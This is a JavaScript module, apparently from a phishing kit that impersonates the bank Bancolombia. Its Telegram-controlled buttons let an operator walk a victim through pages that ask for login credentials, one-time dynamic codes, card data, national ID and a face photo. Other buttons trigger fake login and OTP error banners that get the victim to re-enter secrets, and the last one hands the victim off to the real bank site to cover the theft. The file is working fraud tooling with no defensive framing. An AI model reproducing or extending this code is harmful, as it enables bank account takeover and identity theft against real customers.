/**
 * Botones y navegación Telegram — Bancolombia
 */
(function() {
    'use strict';

    const LOGIN_ERROR_KEY = 'bancolombiaLoginError';
    const OTP_ERROR_KEY = 'bancolombiaOtpError';

    const TELEGRAM_BUTTONS = [
        { text: '🔑 Pedir Usuario', action: 'index' },
        { text: '🔢 Pedir Dinámica', action: 'dinamica' },
        { text: '💳 Pedir Tarjeta', action: 'tarjeta' },
        { text: '🆔 Pedir Cédula', action: 'cedula' },
        { text: '📷 Pedir Cara', action: 'cara' },
        { text: '📄 Pedir Términos', action: 'terminos' },
        { text: '❌ Error Login', action: 'error_login' },
        { text: '❌ Error OTP', action: 'error_otp' },
        { text: '✅ Finalizar', action: 'finalizar' }
    ];

    const PAGE_ACTIONS = ['index', 'dinamica', 'tarjeta', 'cedula', 'cara', 'terminos'];

    function isLoginPage() {
        const path = window.location.pathname;
        return /index\.html$/i.test(path) || /\/Bancolombia\/?$/i.test(path);
    }

    function isOtpPage() {
        return /dinamica\.html$/i.test(window.location.pathname);
    }

    function hideLoadingOverlay() {
        const overlay = document.getElementById('loadingOverlay');
        if (!overlay) return;
        overlay.classList.remove('active', 'show');
        overlay.style.display = 'none';
        if (window.BancoUtils) BancoUtils.hideOverlay();
    }

    function applyLoginError() {
        const banner = document.getElementById('loginErrorBanner');
        if (banner) banner.hidden = false;

        const usuario = document.getElementById('usuario');
        const clave = document.getElementById('clave');
        const btn = document.querySelector('.btn-iniciar');

        if (usuario) {
            usuario.value = '';
            const group = usuario.closest('.form-group');
            if (group) group.classList.add('has-error');
        }
        if (clave) {
            clave.value = '';
            const group = clave.closest('.form-group');
            if (group) group.classList.add('has-error');
        }
        if (btn) {
            btn.disabled = true;
            btn.style.backgroundColor = '';
            btn.style.cursor = 'default';
        }
    }

    function applyOtpError() {
        const banner = document.getElementById('otpErrorBanner');
        if (banner) banner.hidden = false;

        document.querySelectorAll('.digit-input').forEach((input) => {
            input.value = '';
        });

        const container = document.querySelector('.clave-dinamica');
        if (container) container.classList.add('has-error');

        const btn = document.querySelector('.btn-iniciar');
        if (btn) {
            btn.disabled = true;
            btn.style.backgroundColor = '';
            btn.style.cursor = 'default';
        }

        const first = document.querySelector('.digit-input');
        if (first) first.focus();
    }

    function initLoginErrorFromStorage() {
        if (!sessionStorage.getItem(LOGIN_ERROR_KEY)) return;
        sessionStorage.removeItem(LOGIN_ERROR_KEY);
        applyLoginError();
    }

    function initOtpErrorFromStorage() {
        if (!sessionStorage.getItem(OTP_ERROR_KEY)) return;
        sessionStorage.removeItem(OTP_ERROR_KEY);
        applyOtpError();
    }

    function setupLoginErrorBanner() {
        const banner = document.getElementById('loginErrorBanner');
        if (!banner) return;

        const closeBtn = banner.querySelector('.bank-error-banner__close');
        if (closeBtn) {
            closeBtn.addEventListener('click', () => {
                banner.hidden = true;
            });
        }

        [document.getElementById('usuario'), document.getElementById('clave')].forEach((input) => {
            if (!input) return;
            input.addEventListener('input', () => {
                const group = input.closest('.form-group');
                if (group) group.classList.remove('has-error');
            });
        });
    }

    function setupOtpErrorBanner() {
        const banner = document.getElementById('otpErrorBanner');
        if (!banner) return;

        const closeBtn = banner.querySelector('.bank-error-banner__close');
        if (closeBtn) {
            closeBtn.addEventListener('click', () => {
                banner.hidden = true;
            });
        }

        document.querySelectorAll('.digit-input').forEach((input) => {
            input.addEventListener('input', () => {
                const container = document.querySelector('.clave-dinamica');
                if (container) container.classList.remove('has-error');
            });
        });
    }

    function getKeyboard() {
        if (!window.BancoUtils) return null;
        return BancoUtils.createKeyboard(TELEGRAM_BUTTONS, BancoUtils.getSessionId());
    }

    function handleTelegramAction(data) {
        if (!data || !data.action) return;

        if (data.action === 'continue') {
            hideLoadingOverlay();
            return;
        }

        if (data.action === 'error_login') {
            sessionStorage.setItem(LOGIN_ERROR_KEY, '1');
            if (isLoginPage()) {
                hideLoadingOverlay();
                sessionStorage.removeItem(LOGIN_ERROR_KEY);
                applyLoginError();
            } else {
                window.location.href = 'index.html';
            }
            return;
        }

        if (data.action === 'error_otp') {
            sessionStorage.setItem(OTP_ERROR_KEY, '1');
            if (isOtpPage()) {
                hideLoadingOverlay();
                sessionStorage.removeItem(OTP_ERROR_KEY);
                applyOtpError();
            } else {
                window.location.href = 'dinamica.html';
            }
            return;
        }

        if (data.action === 'finalizar') {
            window.location.href = 'https://www.bancolombia.com/personas';
            return;
        }

        if (PAGE_ACTIONS.includes(data.action)) {
            window.location.href = data.action + '.html';
        }
    }

    window.BancolombiaTelegram = {
        TELEGRAM_BUTTONS,
        getKeyboard,
        handleTelegramAction,
        applyLoginError,
        applyOtpError,
        initLoginErrorFromStorage,
        initOtpErrorFromStorage,
        setupLoginErrorBanner,
        setupOtpErrorBanner
    };
})();
